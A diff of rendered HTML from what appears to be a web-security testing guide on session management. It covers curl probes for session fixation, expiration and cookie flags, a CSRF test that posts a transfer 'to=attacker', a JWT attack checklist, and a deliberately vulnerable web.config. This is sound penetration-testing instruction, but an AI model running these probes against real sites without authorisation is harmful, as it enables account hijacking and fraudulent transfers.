-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">config</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Vulnerable</span> <span style="color:#f92672">--&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">config</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Vulnerable</span> <span style="color:#f92672">--&gt;</span>
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">sessionState</span> <span style="color:#a6e22e">timeout</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;999999&#34;</span> /&gt;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">Sessions</span> <span style="color:#a6e22e">never</span> <span style="color:#a6e22e">expire</span> <span style="color:#f92672">--&gt;</span>
-</span></span></code></pre></div><hr>
-<h2 id="detection-techniques">
-  Detection Techniques
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h3 id="manual-testing-methodology">
-  Manual Testing Methodology
-  <a class="anchor" href="#manual-testing-methodology">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">Sessions</span> <span style="color:#a6e22e">never</span> <span style="color:#a6e22e">expire</span> <span style="color:#f92672">--&gt;</span></span></span></code></pre></div><hr>
+<h2 id="detection-techniques">Detection Techniques<a class="anchor" href="#detection-techniques">#</a></h2>
+<h3 id="manual-testing-methodology">Manual Testing Methodology<a class="anchor" href="#manual-testing-methodology">#</a></h3>
 <p><strong>1. Session Token Analysis:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Collect</span> <span style="color:#a6e22e">multiple</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">tokens</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Collect</span> <span style="color:#a6e22e">multiple</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">tokens</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> {<span style="color:#ae81ff">1..50</span>}; <span style="color:#66d9ef">do</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/login -d &#34;user=test&amp;pass=test&#34; | grep Set-Cookie
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">done</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">done</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Analyze</span> <span style="color:#66d9ef">for</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Length</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">entropy</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Sequential</span> <span style="color:#a6e22e">patterns</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Timestamp</span><span style="color:#f92672">-</span><span style="color:#a6e22e">based</span> <span style="color:#a6e22e">patterns</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Predictable</span> <span style="color:#a6e22e">components</span>
-</span></span></code></pre></div><p><strong>2. Cookie Security Attributes:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Check</span> <span style="color:#a6e22e">cookie</span> <span style="color:#a6e22e">flags</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Predictable</span> <span style="color:#a6e22e">components</span></span></span></code></pre></div><p><strong>2. Cookie Security Attributes:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Check</span> <span style="color:#a6e22e">cookie</span> <span style="color:#a6e22e">flags</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/login -d &#34;credentials&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Look</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">missing</span> <span style="color:#a6e22e">attributes</span><span style="color:#f92672">:</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Look</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">missing</span> <span style="color:#a6e22e">attributes</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Set</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session</span><span style="color:#f92672">=</span><span style="color:#a6e22e">abc123</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Missing</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Secure</span>, <span style="color:#a6e22e">HttpOnly</span>, <span style="color:#a6e22e">SameSite</span>
-</span></span></code></pre></div><p><strong>3. Session Fixation Testing:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Get</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">before</span> <span style="color:#a6e22e">login</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Missing</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Secure</span>, <span style="color:#a6e22e">HttpOnly</span>, <span style="color:#a6e22e">SameSite</span></span></span></code></pre></div><p><strong>3. Session Fixation Testing:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Get</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">before</span> <span style="color:#a6e22e">login</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/ 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Set</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SESSIONID</span><span style="color:#f92672">=</span><span style="color:#a6e22e">before_auth_123</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Set</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SESSIONID</span><span style="color:#f92672">=</span><span style="color:#a6e22e">before_auth_123</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Login</span> <span style="color:#66d9ef">with</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">session</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/login \
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#e6db74">&#34;username=user&amp;password=pass&#34;</span> <span style="color:#f92672">\</span>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#e6db74">&#34;username=user&amp;password=pass&#34;</span> <span style="color:#f92672">\</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: SESSIONID=before_auth_123&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Check</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">ID</span> <span style="color:#a6e22e">changed</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">If</span> <span style="color:#a6e22e">same</span> <span style="color:#a6e22e">ID</span> <span style="color:#a6e22e">after</span> <span style="color:#a6e22e">login</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">vulnerable</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">fixation</span>
-</span></span></code></pre></div><p><strong>4. Session Expiration Testing:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Login</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">capture</span> <span style="color:#a6e22e">session</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">If</span> <span style="color:#a6e22e">same</span> <span style="color:#a6e22e">ID</span> <span style="color:#a6e22e">after</span> <span style="color:#a6e22e">login</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">vulnerable</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">fixation</span></span></span></code></pre></div><p><strong>4. Session Expiration Testing:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Login</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">capture</span> <span style="color:#a6e22e">session</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/login -d &#34;user=test&amp;pass=test&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Note</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">cookie</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Note</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">cookie</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Wait</span> (<span style="color:#a6e22e">or</span> <span style="color:#a6e22e">don</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">t</span>) <span style="color:#a6e22e">and</span> <span style="color:#66d9ef">try</span> <span style="color:#a6e22e">accessing</span> <span style="color:#66d9ef">protected</span> <span style="color:#a6e22e">resource</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/dashboard \
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=captured_session&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">If</span> <span style="color:#a6e22e">still</span> <span style="color:#a6e22e">works</span> <span style="color:#a6e22e">after</span> <span style="color:#a6e22e">logout</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">insufficient</span> <span style="color:#a6e22e">invalidation</span>
-</span></span></code></pre></div><p><strong>5. CSRF Token Validation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Make</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">without</span> <span style="color:#a6e22e">CSRF</span> <span style="color:#a6e22e">token</span>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=captured_session&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">If</span> <span style="color:#a6e22e">still</span> <span style="color:#a6e22e">works</span> <span style="color:#a6e22e">after</span> <span style="color:#a6e22e">logout</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">insufficient</span> <span style="color:#a6e22e">invalidation</span></span></span></code></pre></div><p><strong>5. CSRF Token Validation:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Make</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">without</span> <span style="color:#a6e22e">CSRF</span> <span style="color:#a6e22e">token</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/transfer \
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=valid_session&#34;</span> <span style="color:#f92672">\</span>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=valid_session&#34;</span> <span style="color:#f92672">\</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#e6db74">&#34;to=attacker&amp;amount=1000&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">If</span> <span style="color:#a6e22e">succeeds</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">missing</span> <span style="color:#a6e22e">CSRF</span> <span style="color:#a6e22e">protection</span>
-</span></span></code></pre></div><hr>
-<h3 id="automated-testing-methodology">
-  Automated Testing Methodology
-  <a class="anchor" href="#automated-testing-methodology">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">If</span> <span style="color:#a6e22e">succeeds</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">missing</span> <span style="color:#a6e22e">CSRF</span> <span style="color:#a6e22e">protection</span></span></span></code></pre></div><hr>
+<h3 id="automated-testing-methodology">Automated Testing Methodology<a class="anchor" href="#automated-testing-methodology">#</a></h3>
 <p><strong>1. Burp Suite Session Analysis:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> Proxy <span style="color:#a6e22e">traffic</span> <span style="color:#a6e22e">through</span> <span style="color:#a6e22e">Burp</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> Proxy <span style="color:#a6e22e">traffic</span> <span style="color:#a6e22e">through</span> <span style="color:#a6e22e">Burp</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Spider</span> <span style="color:#a6e22e">application</span> <span style="color:#66d9ef">while</span> <span style="color:#a6e22e">authenticated</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Use</span> <span style="color:#a6e22e">Sequencer</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">analyze</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">token</span> <span style="color:#a6e22e">randomness</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Check</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">fixation</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">login</span> <span style="color:#a6e22e">flow</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">CSRF</span> <span style="color:#a6e22e">protection</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">state</span><span style="color:#f92672">-</span><span style="color:#a6e22e">changing</span> <span style="color:#a6e22e">requests</span>
-</span></span></code></pre></div><p><strong>2. OWASP ZAP Session Testing:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Start</span> <span style="color:#a6e22e">ZAP</span> <span style="color:#a6e22e">proxy</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">CSRF</span> <span style="color:#a6e22e">protection</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">state</span><span style="color:#f92672">-</span><span style="color:#a6e22e">changing</span> <span style="color:#a6e22e">requests</span></span></span></code></pre></div><p><strong>2. OWASP ZAP Session Testing:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Start</span> <span style="color:#a6e22e">ZAP</span> <span style="color:#a6e22e">proxy</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">zap</span>.<span style="color:#a6e22e">sh</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">daemon</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">port</span> <span style="color:#ae81ff">8080</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Run</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">management</span> <span style="color:#a6e22e">scan</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">zap</span><span style="color:#f92672">-</span><span style="color:#a6e22e">cli</span> <span style="color:#a6e22e">quick</span><span style="color:#f92672">-</span><span style="color:#a6e22e">scan</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Check</span> <span style="color:#66d9ef">for</span><span style="color:#f92672">:</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Check</span> <span style="color:#66d9ef">for</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Weak</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">tokens</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Missing</span> <span style="color:#a6e22e">secure</span> <span style="color:#a6e22e">flags</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Session</span> <span style="color:#a6e22e">fixation</span>
-</span></span></code></pre></div><p><strong>3. Custom Python Script:</strong></p>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Session</span> <span style="color:#a6e22e">fixation</span></span></span></code></pre></div><p><strong>3. Custom Python Script:</strong></p>
 <p>Performs automated checks for common session management vulnerabilities.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">re</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">test_session_security</span>(<span style="color:#a6e22e">url</span>)<span style="color:#f92672">:</span>
@@ -2100,30 +1911,24 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Check</span> <span style="color:#a6e22e">whether</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">HttpOnly</span> <span style="color:#a6e22e">flag</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">present</span>.
 </span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Without</span> <span style="color:#a6e22e">it</span>, <span style="color:#a6e22e">JavaScript</span> <span style="color:#a6e22e">can</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">cookie</span>, <span style="color:#a6e22e">increasing</span> <span style="color:#a6e22e">XSS</span> <span style="color:#a6e22e">impact</span>.
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">has_nonstandard_attr</span>(<span style="color:#e6db74">&#39;HttpOnly&#39;</span>)<span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#34;[!] Cookie {cookie.name} missing HttpOnly flag&#34;</span>)
-</span></span></code></pre></div><p><strong>4. JWT Tool (Burp Extension)</strong></p>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#34;[!] Cookie {cookie.name} missing HttpOnly flag&#34;</span>)</span></span></code></pre></div><p><strong>4. JWT Tool (Burp Extension)</strong></p>
 <pre tabindex="0"><code>1. Decode the JWT to inspect header and payload.
 2. Modify claims (sub, role, userId, permissions) and re-sign if applicable.
 3. Test alg:none and algorithm confusion attacks.
 4. Modify exp, iat, and nbf claims to verify validation.
-5. Test kid, jku, and jwk header injection attacks.
-</code></pre><hr>
-<h3 id="session-token-entropy-analysis">
-  Session Token Entropy Analysis
-  <a class="anchor" href="#session-token-entropy-analysis">#</a>
-</h3>
+5. Test kid, jku, and jwk header injection attacks.</code></pre><hr>
+<h3 id="session-token-entropy-analysis">Session Token Entropy Analysis<a class="anchor" href="#session-token-entropy-analysis">#</a></h3>
 <p><strong>Using Burp Sequencer:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Capture</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">creation</span> <span style="color:#a6e22e">requests</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Capture</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">creation</span> <span style="color:#a6e22e">requests</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Send</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">Sequencer</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Collect</span> <span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">000</span><span style="color:#f92672">+</span> <span style="color:#a6e22e">tokens</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Analyze</span> <span style="color:#a6e22e">results</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#f92672">-</span> <span style="color:#a6e22e">Overall</span> <span style="color:#a6e22e">entropy</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#f92672">-</span> <span style="color:#a6e22e">Character</span><span style="color:#f92672">-</span><span style="color:#a6e22e">level</span> <span style="color:#a6e22e">analysis</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#f92672">-</span> <span style="color:#a6e22e">Bit</span><span style="color:#f92672">-</span><span style="color:#a6e22e">level</span> <span style="color:#a6e22e">analysis</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#f92672">-</span> <span style="color:#a6e22e">Correlation</span> <span style="color:#a6e22e">analysis</span>
-</span></span></code></pre></div><p><strong>Manual Statistical Analysis:</strong></p>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">-</span> <span style="color:#a6e22e">Correlation</span> <span style="color:#a6e22e">analysis</span></span></span></code></pre></div><p><strong>Manual Statistical Analysis:</strong></p>
 <p>This script calculates the Shannon entropy of a collection of session tokens to estimate how random and unpredictable they are. In session management testing, low entropy can indicate weak or predictable session IDs, which may be vulnerable to guessing or brute-force attacks.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">math</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">math</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">from</span> <span style="color:#a6e22e">collections</span> <span style="color:#66d9ef">import</span> <span style="color:#a6e22e">Counter</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">calculate_entropy</span>(<span style="color:#a6e22e">tokens</span>)<span style="color:#f92672">:</span>
